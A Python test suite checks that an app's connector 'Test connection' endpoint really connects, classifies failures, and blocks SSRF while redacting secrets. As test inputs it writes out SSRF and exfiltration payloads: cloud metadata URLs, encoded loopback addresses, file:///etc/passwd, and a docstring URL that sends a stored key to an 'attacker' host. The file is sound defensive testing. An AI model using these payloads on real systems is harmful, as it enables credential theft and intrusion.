"""The connector "Test connection" button must actually connect (parity P01).

`POST /api/v1/connectors/{id}/test` existed from the first authoring release and opened no
socket. It read the row, echoed the stored `schema_paths` and `sample_payload` back, and returned
`passed: true` -- for every connector, unconditionally, including one whose base_url was a typo
and whose bureau API key had been rotated away months earlier.

That is worse than not having the button. An operator running a production cutover checklist
presses "Test connection", sees green, and records that the credentials work. The button
manufactured exactly the confidence the checklist existed to establish, and it manufactured it
identically whether the integration was perfect or had never worked at all. The first real
signal arrived as a failed decision in prod.

Making it connect creates a second hazard, which is why half of this file is about refusing to
connect. The endpoint needs only the AUTHOR capability (`rbac._AUTHOR_PREFIXES` covers
`/api/v1/connectors`), it loads the connector with `include_secrets=True`, and it attaches those
secrets to an author-supplied URL. Without `app/egress.py` in the path that is a credentialed
SSRF primitive -- `base_url: http://169.254.169.254/...` reads the instance IAM role, and
`base_url: http://attacker/?k={{secrets.api_key}}` exfiltrates a stored key. The probe therefore
goes through the same vet-resolve-pin guard as the real action path, and every byte it returns is
scrubbed of the connector's secrets by value.
"""
from __future__ import annotations

import os
import socket
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Any, Callable, Dict, List
from unittest import mock

APP_ROOT = Path(__file__).resolve().parents[1]
if str(APP_ROOT) not in sys.path:
    sys.path.insert(0, str(APP_ROOT))

os.environ.setdefault("RULEMIND_CONFIG_KEY", "rulemind-test-key")
os.environ.setdefault("RULEMIND_SEED_DEMO", "1")
os.environ.pop("AUTH_MODE", None)
os.environ.pop("RULEMIND_ACTION_ALLOWED_HOSTS", None)

import httpx  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

import app.main as app_main  # noqa: E402
from app import connector_probe, egress  # noqa: E402
from app.connector_probe import ConnectorMisconfigured, probe_connector  # noqa: E402
from app.storage import Storage  # noqa: E402

PUBLIC_IP = "93.184.216.34"
PUBLIC_DNS = [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (PUBLIC_IP, 443))]

# Bound before any patching: `connector_probe.httpx` IS the httpx module, so patching
# `httpx.Client` there patches it everywhere -- including inside the replacement factory, which
# would then call itself forever.
REAL_CLIENT = httpx.Client


def _fake_getaddrinfo(host: str, port: int, *args: Any, **kwargs: Any) -> Any:
    """A NAME resolves to a public address; a literal IP resolves to itself.

    Returning the public address for everything would have made the guard untestable through the
    route -- `base_url: http://169.254.169.254/` would have been "resolved" to a public IP and
    sailed through vet_url. That is exactly the shape of a test that cannot fail.
    """
    import ipaddress

    literal = host.strip("[]")
    try:
        ipaddress.ip_address(literal)
    except ValueError:
        return PUBLIC_DNS
    return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (literal, port))]


def public_dns() -> Any:
    """Resolution is mocked in every test here: CI has no network, and a probe suite that
    depended on one would be a flake generator rather than a guard."""
    return mock.patch.object(egress.socket, "getaddrinfo", side_effect=_fake_getaddrinfo)


class Wire:
    """Captures what the probe actually put on the wire, and decides what comes back.

    Mocking at `httpx.Client` (rather than at `probe_connector`) is deliberate: the requests
    recorded here are the real ones the probe built, so an assertion about a header or a pinned
    URL is an assertion about production behaviour.
    """

    def __init__(self, responder: Callable[[httpx.Request], httpx.Response]):
        self.responder = responder
        self.requests: List[httpx.Request] = []
        self.client_kwargs: Dict[str, Any] = {}
        self.constructed = 0

    def _handle(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        return self.responder(request)

    def factory(self, *args: Any, **kwargs: Any) -> httpx.Client:
        self.constructed += 1
        self.client_kwargs = kwargs
        return REAL_CLIENT(
            transport=httpx.MockTransport(self._handle),
            timeout=kwargs.get("timeout"),
            follow_redirects=kwargs.get("follow_redirects", True),
        )

    def patch(self) -> Any:
        return mock.patch.object(connector_probe.httpx, "Client", self.factory)


def status_responder(code: int, body: str = "{}") -> Callable[[httpx.Request], httpx.Response]:
    return lambda request: httpx.Response(code, text=body)


def raising_responder(error: Exception) -> Callable[[httpx.Request], httpx.Response]:
    def _raise(request: httpx.Request) -> httpx.Response:
        raise error

    return _raise


def connector(**config: Any) -> Dict[str, Any]:
    base = {"auth_type": "api_key", "base_url": "https://bureau.example.com/pull",
            "timeout_ms": 1000, "retries": 0}
    base.update(config)
    return {"id": "probe_test", "name": "Probe Test", "schema_paths": [], "sample_payload": {},
            "is_active": True, "config": base}


# ── the headline: it connects, and it reports what happened ────────────────
class ProbeReportsWhatHappenedTest(unittest.TestCase):
    def _probe(self, responder: Callable[[httpx.Request], httpx.Response], **config: Any) -> Dict[str, Any]:
        wire = Wire(responder)
        with public_dns(), wire.patch():
            result = probe_connector(connector(**config))
        self.last_wire = wire
        return result

    def test_a_reachable_endpoint_passes(self):
        result = self._probe(status_responder(200))
        self.assertTrue(result["passed"])
        self.assertEqual(result["outcome"], "reachable")
        self.assertEqual(result["status"], 200)
        self.assertTrue(result["probed"], "a passing result must say a connection was attempted")

    def test_a_500_does_not_pass(self):
        """THE BUG, in its simplest form. The old handler returned passed:true here."""
        result = self._probe(status_responder(500))
        self.assertFalse(result["passed"], "a connector whose endpoint 500s was reported as passing")
        self.assertEqual(result["outcome"], "http_error")
        self.assertEqual(result["status"], 500)

    def test_a_401_is_reported_as_an_auth_failure_not_a_generic_error(self):
        """The distinction the cutover checklist actually cares about: the endpoint is up and it
        rejected these credentials. 'Connection failed' would send the operator to the network
        team instead of to the key."""
        result = self._probe(status_responder(401))
        self.assertFalse(result["passed"])
        self.assertEqual(result["outcome"], "auth_failed")
        self.assertEqual(result["status"], 401)

    def test_a_timeout_is_distinguishable_from_a_refused_connection(self):
        timed_out = self._probe(raising_responder(httpx.ConnectTimeout("timed out")))
        refused = self._probe(raising_responder(httpx.ConnectError("connection refused")))
        self.assertEqual(timed_out["outcome"], "timeout")
        self.assertEqual(refused["outcome"], "unreachable")
        self.assertFalse(timed_out["passed"])
        self.assertFalse(refused["passed"])

    def test_a_tls_failure_is_named_as_one(self):
        """A bad certificate chain and a dead host are fixed by different people."""
        import ssl

        wrapped = httpx.ConnectError("connect failed")
        wrapped.__cause__ = ssl.SSLCertVerificationError("certificate verify failed")
        result = self._probe(raising_responder(wrapped))
        self.assertEqual(result["outcome"], "tls_failure")
        self.assertFalse(result["passed"])

    def test_a_dns_failure_is_a_downstream_result_not_a_refusal(self):
        wire = Wire(status_responder(200))
        with mock.patch.object(egress.socket, "getaddrinfo", side_effect=socket.gaierror("no such host")):
            with wire.patch():
                result = probe_connector(connector())
        self.assertEqual(result["outcome"], "dns_failure")
        self.assertFalse(result["passed"])
        self.assertEqual(wire.constructed, 0, "a name that does not resolve should not be dialled")

    def test_a_redirect_is_reported_rather_than_followed(self):
        """Following a 3xx would connect to a host that never went through vet_url, undoing the
        pinning. So the redirect is a finding, not a hop."""
        result = self._probe(lambda request: httpx.Response(302, headers={"location": "http://169.254.169.254/"}))
        self.assertEqual(result["status"], 302)
        self.assertFalse(result["passed"])
        self.assertIs(self.last_wire.client_kwargs.get("follow_redirects"), False)

    def test_the_credential_is_actually_sent(self):
        """A probe that omits the credential proves nothing -- every authenticating endpoint would
        answer 401 and the operator would learn only that DNS works."""
        self._probe(status_responder(200), auth_type="api_key", api_key="sk-live-abc")
        self.assertEqual(self.last_wire.requests[0].headers.get("x-api-key"), "sk-live-abc")

    def test_bearer_and_basic_auth_types_are_honoured(self):
        self._probe(status_responder(200), auth_type="bearer", token="tok-123")
        self.assertEqual(self.last_wire.requests[0].headers.get("authorization"), "Bearer tok-123")
        self._probe(status_responder(200), auth_type="basic", username="u", password="p")
        self.assertTrue(str(self.last_wire.requests[0].headers.get("authorization")).startswith("Basic "))


# ── the SSRF guard is on this path, not just the action path ───────────────
class ProbeEgressGuardTest(unittest.TestCase):
    """`app/egress.py` exists because the action path resolved secrets into an author-supplied
    URL and dialled it with no host check. This endpoint has the same shape and the same reach
    (AUTHOR), so skipping the guard here would simply reopen the hole in a new place."""

    def test_the_cloud_metadata_endpoint_is_refused(self):
        """The canonical SSRF target: 169.254.169.254 hands out the instance's IAM role."""
        wire = Wire(status_responder(200))
        with wire.patch():
            with self.assertRaises(ConnectorMisconfigured) as raised:
                probe_connector(connector(base_url="http://169.254.169.254/latest/meta-data/"))
        self.assertEqual(raised.exception.code, "blocked_by_egress_policy")
        self.assertEqual(wire.constructed, 0, "the blocked target was still dialled")

    def test_loopback_and_encoded_internal_targets_are_refused(self):
        """Range-checking the RESOLVED address, not the literal string, is what catches these."""
        for url in ("http://127.0.0.1:8080/internal", "http://127.1/", "http://2130706433/",
                    "http://[::1]/", "http://[::ffff:169.254.169.254]/"):
            with self.subTest(url=url):
                wire = Wire(status_responder(200))
                with wire.patch():
                    with self.assertRaises(ConnectorMisconfigured):
                        probe_connector(connector(base_url=url))
                self.assertEqual(wire.constructed, 0)

    def test_a_public_name_resolving_to_a_private_ip_is_refused(self):
        """The A-record attack a string blocklist cannot see."""
        wire = Wire(status_responder(200))
        with mock.patch.object(egress.socket, "getaddrinfo",
                               return_value=[(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.0.0.5", 443))]):
            with wire.patch():
                with self.assertRaises(ConnectorMisconfigured):
                    probe_connector(connector(base_url="https://evil.example.com/"))
        self.assertEqual(wire.constructed, 0)

    def test_a_non_http_scheme_is_refused(self):
        with self.assertRaises(ConnectorMisconfigured):
            probe_connector(connector(base_url="file:///etc/passwd"))

    def test_the_connection_is_pinned_to_the_vetted_ip(self):
        """Vetting then re-resolving would leave a DNS-rebinding window. The socket must go to
        the address that was checked, with the hostname surviving only as Host/SNI."""
        wire = Wire(status_responder(200))
        with public_dns(), wire.patch():
            probe_connector(connector(base_url="https://bureau.example.com/pull"))
        request = wire.requests[0]
        self.assertEqual(request.url.host, PUBLIC_IP,
                         "the probe dialled the hostname -- a rebind could swing it internal")
        self.assertEqual(request.headers.get("host"), "bureau.example.com")


class ProbeEgressClassificationTest(unittest.TestCase):
    """`egress.vet_url` funnels a DNS failure and a policy refusal through one exception type,
    and the probe has to tell them apart to pick 200-with-a-result vs 422. That classification
    reads egress's wording, so it is pinned against the real exceptions here -- otherwise a
    reworded message would silently start reporting every unresolvable host as a policy block.
    """

    def test_a_resolution_failure_is_classified_as_one(self):
        with mock.patch.object(egress.socket, "getaddrinfo", side_effect=socket.gaierror("nodename")):
            with self.assertRaises(egress.EgressBlocked) as raised:
                egress.vet_url("https://nope.example.com/")
        self.assertTrue(connector_probe._egress_is_resolution_failure(raised.exception),
                        "egress reworded its DNS message; the probe now reports DNS as a 422")

    def test_a_policy_refusal_is_not_classified_as_a_resolution_failure(self):
        with mock.patch.object(egress.socket, "getaddrinfo",
                               return_value=[(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("169.254.169.254", 80))]):
            with self.assertRaises(egress.EgressBlocked) as raised:
                egress.vet_url("http://evil.example.com/")
        self.assertFalse(connector_probe._egress_is_resolution_failure(raised.exception),
                         "an SSRF refusal would be downgraded to a downstream DNS report")


# ── secrets must not come back out ─────────────────────────────────────────
class ProbeSecretRedactionTest(unittest.TestCase):
    SECRET = "sk-live-DO-NOT-ECHO-4f2b9"

    def _probe(self, responder: Callable[[httpx.Request], httpx.Response], **config: Any) -> Dict[str, Any]:
        conn = connector(api_key=self.SECRET, **config)
        wire = Wire(responder)
        with public_dns(), wire.patch():
            result = probe_connector(conn)
        self.last_wire = wire
        return connector_probe.redact_connector_secrets(result, conn)

    def test_a_secret_resolved_into_the_url_is_not_echoed_back(self):
        """`{{secrets.api_key}}` in a query string resolves into the URL the probe reports. Key-
        name masking cannot help -- `base_url` is not a secret-marked key -- so redaction is by
        VALUE."""
        result = self._probe(status_responder(200),
                             base_url="https://bureau.example.com/pull?k={{secrets.api_key}}")
        self.assertNotIn(self.SECRET, repr(result), "the probe echoed a stored secret back to the caller")
        # ...and it really did send it, so this is redaction, not omission.
        self.assertIn(self.SECRET, str(self.last_wire.requests[0].url))

    def test_a_secret_reflected_in_a_transport_error_is_not_echoed_back(self):
        """httpx puts the full URL in its connection errors, and the URL can carry the secret."""
        error = httpx.ConnectError("failed to connect to https://h/pull?k={0}".format(self.SECRET))
        result = self._probe(raising_responder(error))
        self.assertNotIn(self.SECRET, repr(result))
        self.assertEqual(result["outcome"], "unreachable")

    def test_the_downstream_response_body_is_never_echoed(self):
        """A partner endpoint that reflects the Authorization header into its 400 body would
        otherwise hand the credential straight back through this endpoint."""
        body = "bad key: {0}".format(self.SECRET)
        result = self._probe(status_responder(400, body=body))
        self.assertNotIn(self.SECRET, repr(result))
        self.assertNotIn("bad key", repr(result))


# ── bounded ────────────────────────────────────────────────────────────────
class ProbeIsBoundedTest(unittest.TestCase):
    def test_author_supplied_tunables_cannot_stretch_the_probe(self):
        """Unclamped, `timeout_ms: 600000` x `retries: 10` is a 100-minute request holding a
        worker -- from a button in the dashboard."""
        wire = Wire(raising_responder(httpx.ConnectTimeout("timed out")))
        with public_dns(), wire.patch():
            result = probe_connector(connector(timeout_ms=600000, retries=10))
        self.assertLessEqual(wire.client_kwargs["timeout"], connector_probe.PROBE_MAX_TIMEOUT_MS / 1000)
        self.assertLessEqual(result["attempts"], connector_probe.PROBE_MAX_RETRIES + 1)
        self.assertLessEqual(len(wire.requests), connector_probe.PROBE_MAX_RETRIES + 1)


# ── through the route ──────────────────────────────────────────────────────
class ConnectorTestRouteTest(unittest.TestCase):
    def setUp(self):
        self.tempdir = tempfile.TemporaryDirectory()
        app_main.storage = Storage(path=os.path.join(self.tempdir.name, "probe.db"))
        self.tenant = app_main.storage.default_tenant_id
        self.client = TestClient(app_main.app)
        self.headers = {"x-api-key": app_main.storage.default_api_key or ""}

    def tearDown(self):
        self.client.close()
        self.tempdir.cleanup()

    def _create(self, **config: Any) -> str:
        payload = connector(**config)
        payload["id"] = "probe_{0}".format(len(app_main.storage.list_connectors()))
        app_main.storage.create_connector(payload, tenant_id=self.tenant)
        return str(payload["id"])

    def _test(self, connector_id: str, wire: Wire) -> httpx.Response:
        with public_dns(), wire.patch():
            return self.client.post("/api/v1/connectors/{0}/test".format(connector_id), headers=self.headers)

    def test_a_failing_downstream_is_200_with_passed_false(self):
        """"Your bureau is down" is a successful probe. Returning 4xx would tell the operator to
        go and edit a connector that is configured correctly."""
        res = self._test(self._create(), Wire(status_responder(503)))
        self.assertEqual(res.status_code, 200, res.text[:300])
        body = res.json()
        self.assertFalse(body["passed"], "the endpoint still reports passed:true for a dead downstream")
        self.assertEqual(body["probe"]["outcome"], "http_error")
        self.assertEqual(body["probe"]["status"], 503)

    def test_a_misconfigured_connector_is_a_4xx(self):
        """The other fact. Nothing downstream was reached because there is nothing to reach --
        the operator has to change the connector, and a 200 would bury that."""
        blocked = self._test(self._create(base_url="http://169.254.169.254/"), Wire(status_responder(200)))
        self.assertEqual(blocked.status_code, 422, blocked.text[:300])
        none_configured = self._test(self._create(base_url="", webhook_url=""), Wire(status_responder(200)))
        self.assertEqual(none_configured.status_code, 422, none_configured.text[:300])

    def test_a_reachable_connector_passes_through_the_route(self):
        """The regression guard: refusing to lie must not turn into refusing to pass."""
        res = self._test(self._create(), Wire(status_responder(200)))
        self.assertEqual(res.status_code, 200)
        self.assertTrue(res.json()["passed"])

    def test_no_secret_survives_the_route(self):
        secret = "sk-live-ROUTE-9c1"
        cid = self._create(api_key=secret, base_url="https://bureau.example.com/pull?k={{secrets.api_key}}")
        res = self._test(cid, Wire(status_responder(200)))
        self.assertEqual(res.status_code, 200)
        self.assertNotIn(secret, res.text, "the connector test leaked a stored secret to the caller")

    def test_a_simulate_url_passes_but_says_nothing_was_dialled(self):
        """The seeded travel/loan/sme connectors are simulation stubs and the executor short-
        circuits them identically. Reporting them as passing is only honest because `probed` says
        no socket was opened."""
        wire = Wire(status_responder(200))
        res = self._test(self._create(base_url="rulemind://simulate/travel-verification"), wire)
        body = res.json()
        self.assertTrue(body["passed"])
        self.assertFalse(body["probe"]["probed"])
        self.assertEqual(body["probe"]["outcome"], "simulated")
        self.assertEqual(wire.constructed, 0)

    def test_a_failed_probe_is_alertable(self):
        """Recorded as an error event, so a connector that quietly stopped working shows up
        without anyone pressing the button again."""
        self._test(self._create(), Wire(status_responder(503)))
        events = app_main.storage.list_error_events(tenant_id=self.tenant)
        self.assertTrue([e for e in events if e.get("stage") == "connector_test"],
                        "a failed connector test produced no error event")

    def test_an_unknown_connector_is_still_404(self):
        res = self.client.post("/api/v1/connectors/nope/test", headers=self.headers)
        self.assertEqual(res.status_code, 404)

    def test_the_response_still_carries_the_fields_the_dashboard_reads(self):
        res = self._test(self._create(), Wire(status_responder(200)))
        body = res.json()
        for key in ("connector_id", "passed", "schema_paths", "sample_payload", "config_summary"):
            self.assertIn(key, body, "removing {0} breaks the existing client contract".format(key))


if __name__ == "__main__":
    unittest.main()
